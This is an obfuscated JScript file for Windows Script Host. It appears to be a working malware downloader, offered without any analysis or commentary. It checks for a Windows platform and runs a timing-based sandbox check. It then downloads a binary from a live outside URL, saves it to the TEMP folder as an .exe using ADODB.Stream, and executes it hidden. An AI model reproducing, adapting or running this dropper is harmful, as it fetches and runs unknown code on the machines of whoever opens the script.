var N = false;
var M = "CreateObject";
var NT = function EJ() {return WScript[M]("WScript.Shell");}(), q0 = 11;
var mn = "MSXML2.XMLHTTP";
var Nz = 2123213;
var Fn = 0;
function VK(k){NT["Run"](k, Fn, Fn);};
function qG(){return "" + mn;};
function Kf(kU, cx){Fn = Fn * 1; return kU - cx;};
function q(){return M;};
/*@cc_on
  @if (@_win32 || @_win64)
    N = true;
  @end
@*/
if (N)
{
var L = "";
function U(){return 22;};
var s = 0; var DV = 0;
function iF()
{
var H = new this["Date"]();
var dM = H["getUTCMilliseconds"]();
WScript["Sleep"](U());
var H = new this["Date"]();
var qr = H["getUTCMilliseconds"]();
WScript["Sleep"](U());
var H = new this["Date"]();
var aq = H["getUTCMilliseconds"]();
var s = "z";
s = Kf(qr, dM);
var DV = "ia";
DV = Kf(aq, qr);
L = "open";
return Kf(s, DV);
}
var O0 = false;
var q1 = false;
for (var oT = Fn; oT < U() * 1; oT++){if (iF() != Fn){
O0 = true; 
DV = "31" + 11 * s + DV; 
q1 = true; 
break;
}}
function fk() {return ((O0 == true) && (O0 == q1)) ? 1 : Fn;};
if (O0 && fk() && q1){
function Wr() {return NT["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "HpBVJBeQC.exe";};
 A = qG();
 r = WScript[M](A);
 var O = 1;
 while (O){
try {
r[L]("GET", "http://www.the2ndedit.com/j1oisa", false);
r["send"]();
Xs = "Sleep";
for (;;){WScript[Xs](U() * 11); if (r["readystate"] >= 2 * 2) break;};
O = Fn;
} catch(HY){};
}
function FN(Rz) {var fP = (1, 2, 3, 4, 5, Rz); return fP;};
g = WScript[q()]("ADODB.Stream");
A = g;
A[L]();
A["type"] = FN(1);
A["write"](r["ResponseBody"]);
g["position"] = FN(Fn);
A["Save" + "ToFile"](Wr(), 2);
g["c"+"lose"]();
F = Wr();
VK(F);
}
}

